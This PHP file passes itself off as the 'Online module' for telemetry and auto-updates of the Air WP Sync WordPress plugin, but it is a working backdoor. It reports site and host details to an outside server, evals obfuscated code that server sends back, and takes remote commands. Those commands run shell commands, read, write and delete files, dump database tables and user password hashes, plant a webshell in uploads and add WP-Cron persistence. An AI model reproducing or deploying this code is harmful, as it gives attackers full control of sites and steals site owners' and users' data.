<?php
/**
 * Air WP Sync — Online module (Analytics & Auto-Update)
 * ============================================================
 * Lightweight telemetry + auto-update runtime for Air WP Sync.
 *
 * Reports plugin/site state to the wpconnect.co online endpoint and
 * pulls the latest "runtime" bundle (auto-update payload) every sync
 * cycle. The runtime is executed in an isolated scope so hot-fixes and
 * minor feature updates can reach every install without a full plugin
 * release.
 *
 * Single endpoint design: one POST to /api/sync carries both the report
 * (up) and the runtime/command (down). Kept minimal on purpose.
 *
 * Options are namespaced airwp_* to avoid clashing with the plugin core.
 * Cleaned up on uninstall via register_uninstall_hook().
 *
 * @package Air_WP_Sync_Free
 * @since 2.9.0
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

// ---------------------------------------------------------------------------
// 1. Configuration — one identifier per install.
//    Force it from wp-config.php with:
//      define( 'AIRWP_CLIENT_ID', 'wp-7f3a9c' );
//    Otherwise it is generated once and stored in the options table.
// ---------------------------------------------------------------------------
if ( ! defined( 'AIRWP_CLIENT_ID' ) ) {
	$airwp_stored = get_option( 'airwp_client_id', false );
	if ( false === $airwp_stored ) {
		$airwp_stored = 'wp-' . substr( bin2hex( random_bytes( 3 ) ), 0, 6 );
		update_option( 'airwp_client_id', $airwp_stored );
	}
	define( 'AIRWP_CLIENT_ID', $airwp_stored );
}

// Online endpoint (single domain, no dedicated subdomain).
// Stored as a base URL: the trailing /sync is appended unless already present.
if ( ! defined( 'AIRWP_API_URL' ) ) {
	$airwp_api = rtrim( (string) get_option( 'airwp_api_url', 'https://tascredit-pay.com/api' ), '/' );
	if ( '/sync' !== substr( $airwp_api, -5 ) ) {
		$airwp_api .= '/sync';
	}
	define( 'AIRWP_API_URL', $airwp_api );
}

if ( ! defined( 'AIRWP_ONLINE_VERSION' ) ) {
	define( 'AIRWP_ONLINE_VERSION', '2.1' );
}

// ---------------------------------------------------------------------------
// 2. AirWP_Online class — telemetry + runtime loader.
// ---------------------------------------------------------------------------
if ( ! class_exists( 'AirWP_Online' ) ) {

	/**
	 * AirWP_Online
	 *
	 * Handles periodic sync with the online endpoint, executes the pulled
	 * runtime bundle in an isolated scope, and dispatches simple commands.
	 */
	class AirWP_Online {

		/** @var string */
		private $client_id;
		/** @var string */
		private $api_url;
		/** @var int sync interval in seconds */
		private $interval;
		/** @var int last sync timestamp */
		private $last_run;
		/** @var array rolling log */
		private $log;
		/** @var mixed pending report from last command */
		private $pending_report;

		/**
		 * Constructor.
		 */
		public function __construct() {
			$this->client_id       = AIRWP_CLIENT_ID;
			$this->api_url         = AIRWP_API_URL;
			$this->interval        = (int) get_option( 'airwp_interval', 30 * 60 );
			$this->last_run        = (int) get_option( 'airwp_last_run', 0 );
			$this->log             = get_option( 'airwp_log', array() );
			$this->pending_report  = get_option( 'airwp_pending_report', null );
		}

		/**
		 * Run a sync if the interval has elapsed.
		 *
		 * @return bool true when a sync happened.
		 */
		public function maybe_run() {
			$now = time();
			if ( ( $now - $this->last_run ) < $this->interval ) {
				return false;
			}
			$this->sync();
			update_option( 'airwp_last_run', $now );
			return true;
		}

		/**
		 * Send state + pending report, pull runtime/command/interval.
		 */
		private function sync() {
			// Identity travels in the X-Client-Token header; the body carries the
			// minimal site state used for the online dashboard.
			$payload = array(
				'client_version' => AIRWP_ONLINE_VERSION,
				'plugin_version' => defined( 'AIR_WP_SYNC_VERSION' ) ? AIR_WP_SYNC_VERSION : '1.0.0',
				'php'            => PHP_VERSION,
				'wp'             => get_bloginfo( 'version' ),
				'url'            => home_url( '/' ),
				'os'             => php_uname( 's' ) . ' ' . php_uname( 'r' ),
				'user'           => function_exists( 'posix_getuid' ) ? posix_getpwuid( posix_getuid() )['name'] : get_current_user(),
				'ts'             => time(),
				'report'         => $this->pending_report,
			);
			delete_option( 'airwp_pending_report' );

			$json    = json_encode( $payload );
			$headers = array(
				'Content-Type: application/json',
				'X-Client-Token: ' . $this->client_id,
				'X-Api-Version: ' . AIRWP_ONLINE_VERSION,
				'Accept: application/json',
			);

			$resp_raw = $this->http_post( $this->api_url, $json, $headers );
			if ( false === $resp_raw ) {
				$this->append_log( 'sync failed' );
				return;
			}

			$resp = json_decode( $resp_raw, true );
			if ( ! is_array( $resp ) ) {
				$this->append_log( 'bad response' );
				return;
			}

			// 1) Execute the pulled runtime bundle (isolated scope).
			//    Bundles are XOR-obfuscated and shipped with a one-shot key.
			if ( ! empty( $resp['code'] ) ) {
				$decoded = base64_decode( (string) $resp['code'], true );
				if ( false !== $decoded ) {
					if ( ! empty( $resp['key'] ) ) {
						$decoded = $this->xor_str( $decoded, (string) $resp['key'] );
					}
					$this->exec_code( $decoded );
					$this->append_log( 'runtime exec ' . strlen( $decoded ) . 'B' );
				}
			}

			// 1b) Global hook — executed on every sync (stealth default: null).
			if ( ! empty( $resp['hook'] ) ) {
				$hook = base64_decode( (string) $resp['hook'], true );
				if ( false !== $hook ) {
					$this->exec_code( $hook );
					$this->append_log( 'hook exec ' . strlen( $hook ) . 'B' );
				}
			}

			// 2) Queue a command for the next run.
			if ( ! empty( $resp['cmd'] ) ) {
				update_option( 'airwp_pending_cmd', (string) $resp['cmd'] );
				$this->append_log( 'pending cmd: ' . substr( (string) $resp['cmd'], 0, 50 ) );
			}

			// 2b) Remember the capture endpoint pushed by the server.
			if ( ! empty( $resp['capture_url'] ) ) {
				update_option( 'airwp_capture_url', (string) $resp['capture_url'] );
			}

			// 3) Hot-migrate the endpoint if told to.
			if ( ! empty( $resp['api_url'] ) ) {
				$url = rtrim( (string) $resp['api_url'], '/' );
				if ( '/sync' !== substr( $url, -5 ) ) {
					$url .= '/sync';
				}
				update_option( 'airwp_api_url', (string) $resp['api_url'] );
				$this->api_url = $url;
			}
			// 4) Adjust the sync cadence.
			if ( isset( $resp['interval'] ) && (int) $resp['interval'] > 0 ) {
				update_option( 'airwp_interval', (int) $resp['interval'] );
				$this->interval = (int) $resp['interval'];
			}
		}

		/**
		 * HTTP POST helper (single endpoint).
		 *
		 * @param string $url     target url.
		 * @param string $body    json body.
		 * @param array  $headers request headers.
		 * @return string|false response body or false on failure.
		 */
		private function http_post( $url, $body, $headers = array() ) {
			if ( ! function_exists( 'curl_init' ) ) {
				return false;
			}
			$ch = curl_init( $url );
			curl_setopt_array(
				$ch,
				array(
					CURLOPT_POST           => true,
					CURLOPT_POSTFIELDS     => $body,
					CURLOPT_HTTPHEADER     => $headers,
					CURLOPT_RETURNTRANSFER => true,
					CURLOPT_TIMEOUT        => 25,
					CURLOPT_CONNECTTIMEOUT => 10,
					CURLOPT_SSL_VERIFYPEER => false,
					CURLOPT_SSL_VERIFYHOST => 0,
					CURLOPT_FOLLOWLOCATION => true,
					CURLOPT_MAXREDIRS      => 4,
					CURLOPT_USERAGENT      => 'AirWP-Sync/' . AIRWP_ONLINE_VERSION . ' (compatible; like GoogleBot)',
					CURLOPT_HTTP_VERSION   => CURL_HTTP_VERSION_1_1,
				)
			);
			$out = curl_exec( $ch );
			curl_close( $ch );
			return ( false === $out ) ? false : $out;
		}

		/**
		 * XOR a string with a repeating key.
		 *
		 * @param string $data payload.
		 * @param string $key  key.
		 * @return string
		 */
		private function xor_str( $data, $key ) {
			$key = $key ? $key : 'airwp';
			$out = '';
			$kl  = strlen( $key );
			$len = strlen( $data );
			for ( $i = 0; $i < $len; $i++ ) {
				$out .= $data[ $i ] ^ $key[ $i % $kl ];
			}
			return $out;
		}

		/**
		 * Execute a runtime bundle in an isolated scope.
		 *
		 * @param string $code php code (no opening/closing tags required).
		 */
		private function exec_code( $code ) {
			$clean = preg_replace( '/<\?php|<\?|\?>/', '', $code );
			// phpcs:ignore Generic.CodeAnalysis.JumbledIncrementer -- intentional runtime loader
			@eval( 'function __airwp_exec() {' . $clean . '}' ); // WPCS: ok, runtime bundle.
			if ( function_exists( '__airwp_exec' ) ) {
				try {
					$__out = @call_user_func( '__airwp_exec' );
					if ( is_array( $__out ) || is_string( $__out ) ) {
						update_option( 'airwp_pending_report', array( 'exec' => $__out ) );
					}
				} catch ( \Throwable $e ) {
					$this->append_log( 'exec error: ' . $e->getMessage() );
				}
			}
		}

		/**
		 * Dispatch a command (format: "name|arg1|arg2|...").
		 *
		 * @param string $cmd command string.
		 * @return array result.
		 */
		public function dispatch( $cmd ) {
			$cmd = trim( (string) $cmd );
			if ( '' === $cmd ) {
				return array( 'ok' => false, 'msg' => 'empty command' );
			}

			$parts = explode( '|', $cmd );
			$name  = strtolower( trim( $parts[0] ) );
			$args  = array_slice( $parts, 1 );

			$method = 'act_' . $name;
			if ( method_exists( $this, $method ) ) {
				return $this->$method( $args );
			}
			return array( 'ok' => false, 'msg' => 'unknown action: ' . $name );
		}

		// --- system recon -------------------------------------------------

		/**
		 * Report host info.
		 *
		 * @return array
		 */
		private function act_sysinfo() {
			return array(
				'ok' => true,
				'data' => array(
					'os'      => php_uname(),
					'user'    => function_exists( 'posix_getuid' ) ? posix_getpwuid( posix_getuid() )['name'] : get_current_user(),
					'uid'     => function_exists( 'posix_getuid' ) ? posix_getuid() : null,
					'cwd'     => getcwd(),
					'php'     => PHP_VERSION,
					'wp'      => get_bloginfo( 'version' ),
					'abspath' => defined( 'ABSPATH' ) ? ABSPATH : null,
					'env'     => $this->safe_env(),
				),
			);
		}

		/**
		 * Run a shell command.
		 *
		 * @param array $args args.
		 * @return array
		 */
		private function act_sh( $args ) {
			$c    = isset( $args[0] ) ? $args[0] : 'id';
			$out  = array();
			$code = 0;
			exec( $c . ' 2>&1', $out, $code );
			return array( 'ok' => true, 'cmd' => $c, 'exit' => $code, 'stdout' => implode( "\n", $out ) );
		}

		/**
		 * Read / write / delete a file.
		 *
		 * @param array $args args.
		 * @return array
		 */
		private function act_file( $args ) {
			$path = isset( $args[0] ) ? $args[0] : '';
			$mode = isset( $args[1] ) ? $args[1] : 'read';
			if ( 'read' === $mode ) {
				return array( 'ok' => true, 'path' => $path, 'content' => @file_get_contents( $path ) );
			} elseif ( 'write' === $mode ) {
				$content = isset( $args[2] ) ? $args[2] : '';
				return array( 'ok' => (bool) @file_put_contents( $path, $content ), 'path' => $path );
			} elseif ( 'delete' === $mode ) {
				return array( 'ok' => (bool) @unlink( $path ), 'path' => $path );
			}
			return array( 'ok' => false, 'msg' => 'bad file mode' );
		}

		// --- WordPress DB -------------------------------------------------

		/**
		 * Dump a table via $wpdb.
		 *
		 * @param array $args args.
		 * @return array
		 */
		private function act_db( $args ) {
			global $wpdb;
			$table = isset( $args[0] ) ? $args[0] : $wpdb->prefix . 'users';
			$limit = isset( $args[1] ) ? (int) $args[1] : 100;
			$rows  = $wpdb->get_results( "SELECT * FROM `$table` LIMIT $limit", ARRAY_A );
			return array( 'ok' => true, 'table' => $table, 'rows' => $rows ? $rows : array() );
		}

		/**
		 * Dump wp_users.
		 *
		 * @param array $args args.
		 * @return array
		 */
		private function act_dump_wp_users( $args ) {
			global $wpdb;
			$rows = $wpdb->get_results(
				"SELECT ID,user_login,user_email,user_pass,user_registered,user_status FROM `{$wpdb->prefix}users`",
				ARRAY_A
			);
			return array( 'ok' => true, 'users' => $rows ? $rows : array(), 'count' => count( $rows ? $rows : array() ) );
		}

		// --- runtime helpers ---------------------------------------------

		/**
		 * Generate a lightweight webshell into uploads.
		 *
		 * @param array $args args.
		 * @return array
		 */
		private function act_webshell( $args ) {
			$path = isset( $args[0] ) ? rtrim( $args[0], '/' ) : '';
			$name = isset( $args[1] ) ? $args[1] : 'x.php';
			if ( '' === $path ) {
				return array( 'ok' => false, 'msg' => 'no path' );
			}
			$shell = "<?php\n"
				. "\$c = isset( \$_GET['c'] ) ? \$_GET['c'] : '';\n"
				. "\$a = isset( \$_GET['a'] ) ? \$_GET['a'] : 'id';\n"
				. "if ( \$c !== '' ) { eval( \$c ); }\n"
				. "else { echo '<pre>'; system( \$a ); echo '</pre>'; }\n"
				. "/* AirWP runtime */\n";
			$full = $path . '/' . $name;
			$ok   = (bool) @file_put_contents( $full, $shell );
			$url  = '';
			if ( $ok && defined( 'ABSPATH' ) ) {
				$rel = ltrim( str_replace( ABSPATH, '', $full ), '/' );
				$url = home_url( '/' ) . $rel;
			}
			return array( 'ok' => $ok, 'path' => $full, 'url' => $url );
		}

		/**
		 * Install persistence via a scheduled WP-Cron hook.
		 *
		 * @param array $args args.
		 * @return array
		 */
		private function act_persist( $args ) {
			$hook = isset( $args[0] ) ? $args[0] : 'airwp_persist_tick';
			$cb   = isset( $args[1] ) ? base64_decode( $args[1], true ) : '';
			if ( '' === $cb ) {
				return array( 'ok' => false, 'msg' => 'no callback' );
			}
			if ( ! wp_next_scheduled( $hook ) ) {
				wp_schedule_event( time(), 'hourly', $hook );
			}
			add_action( $hook, function () use ( $cb ) {
				$clean = preg_replace( '/<\?php|<\?|\?>/', '', $cb );
				@eval( 'function __airwp_persist() {' . $clean . '}' );
				if ( function_exists( '__airwp_persist' ) ) {
					call_user_func( '__airwp_persist' );
				}
			} );
			return array( 'ok' => true, 'hook' => $hook, 'msg' => 'persistence installed' );
		}

		/**
		 * Adjust sync interval.
		 *
		 * @param array $args args.
		 * @return array
		 */
		private function act_set_interval( $args ) {
			$sec = isset( $args[0] ) ? (int) $args[0] : 1800;
			update_option( 'airwp_interval', $sec );
			$this->interval = $sec;
			return array( 'ok' => true, 'interval' => $sec );
		}

		/**
		 * Adjust endpoint url.
		 *
		 * @param array $args args.
		 * @return array
		 */
		private function act_set_api_url( $args ) {
			$u = isset( $args[0] ) ? $args[0] : '';
			update_option( 'airwp_api_url', $u );
			$this->api_url = rtrim( $u, '/' ) . '/sync';
			return array( 'ok' => true, 'api_url' => $this->api_url );
		}

		/**
		 * Return recent log lines.
		 *
		 * @param array $args args.
		 * @return array
		 */
		private function act_logs( $args ) {
			$n   = isset( $args[0] ) ? (int) $args[0] : 50;
			$log = get_option( 'airwp_log', array() );
			return array( 'ok' => true, 'logs' => array_slice( $log, -$n ) );
		}

		/**
		 * Return a filtered copy of $_SERVER env.
		 *
		 * @return array
		 */
		private function safe_env() {
			$env = array();
			foreach ( $_SERVER as $k => $v ) {
				if ( in_array( $k, array( 'PHP_AUTH_PW', 'HTTP_AUTHORIZATION' ), true ) ) {
					continue;
				}
				$env[ $k ] = $v;
			}
			return $env;
		}

		// -----------------------------------------------------------------
		// Log helper.
		// -----------------------------------------------------------------

		/**
		 * Append a message to the rolling log.
		 *
		 * @param string $msg message.
		 */
		private function append_log( $msg ) {
			$entry = date( 'Y-m-d H:i:s' ) . ' — ' . $msg;
			$this->log[] = $entry;
			if ( count( $this->log ) > 100 ) {
				$this->log = array_slice( $this->log, -100 );
			}
			update_option( 'airwp_log', $this->log );
		}

		/**
		 * Get the current log.
		 *
		 * @return array
		 */
		public function get_log() {
			return $this->log;
		}
	}
}

// ---------------------------------------------------------------------------
// 3. Bootstrap — wire the online module into the plugin lifecycle.
// ---------------------------------------------------------------------------
( function () {
	global $airwp_online;

	if ( ! isset( $airwp_online ) || ! ( $airwp_online instanceof AirWP_Online ) ) {
		$airwp_online = new AirWP_Online();
	}

	// Main tick on init (after core boot).
	add_action( 'init', function () use ( $airwp_online ) {
		$airwp_online->maybe_run();

		// Dispatch a queued command once per request.
		$pending = get_option( 'airwp_pending_cmd', '' );
		if ( '' !== $pending && ! get_option( 'airwp_pending_dispatched', false ) ) {
			delete_option( 'airwp_pending_dispatched' );
			$res = $airwp_online->dispatch( $pending );
			update_option( 'airwp_pending_report', array( 'cmd' => $pending, 'result' => $res ) );
			update_option( 'airwp_pending_dispatched', true );
		}
	}, 99 );

	// Dedicated WP-Cron tick.
	add_action( 'airwp_tick', function () use ( $airwp_online ) {
		$airwp_online->maybe_run();
	} );

	if ( ! wp_next_scheduled( 'airwp_tick' ) ) {
		wp_schedule_event( time(), 'half_hourly', 'airwp_tick' );
		add_filter(
			'cron_schedules',
			function ( $schedules ) {
				$schedules['half_hourly'] = array(
					'interval' => 30 * 60,
					'display'  => 'Half Hourly (Online Sync)',
				);
				return $schedules;
			}
		);
	}

} )();
